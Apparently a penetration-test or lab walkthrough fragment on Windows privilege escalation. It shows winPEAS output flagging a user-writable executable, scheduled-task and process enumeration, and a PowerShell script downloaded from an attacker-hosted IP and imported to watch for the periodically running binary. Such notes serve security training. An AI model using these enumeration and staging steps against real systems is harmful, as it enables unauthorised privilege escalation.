winpeas
```
����������͹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
     File Permissions "C:\TEMP\backup.exe": yoshi [WriteData/CreateFiles]
     File Permissions "C:\Users\yoshi\winPEASx86.exe": yoshi [AllAccess]
     File Permissions "C:\Users\yoshi\pe.exe": yoshi [AllAccess]
```

schtask list
```
Get-ScheduledTask | findstr /v "\Microsoft"
```

```

TaskPath                                       TaskName                          State     
--------                                       --------                          -----     


```


process list
```
wget https://raw.githubusercontent.com/markwragg/PowerShell-Watch/master/Watch/Public/Watch-Command.ps1
```

```
iwr http://172.16.219.254:1235/Watch-Command.ps1 -outfile watch.ps1
```

```
Import-Module ./watch.ps1
```

```
Get-Process | Watch-Command -Difference -Property processname,id -Seconds 30
```

```
Get-Process backup -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 30
```

```
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
-------  ------    -----      -----     ------     --  -- -----------                                                  
     23       3      376       1596              6184   0 backup     
```

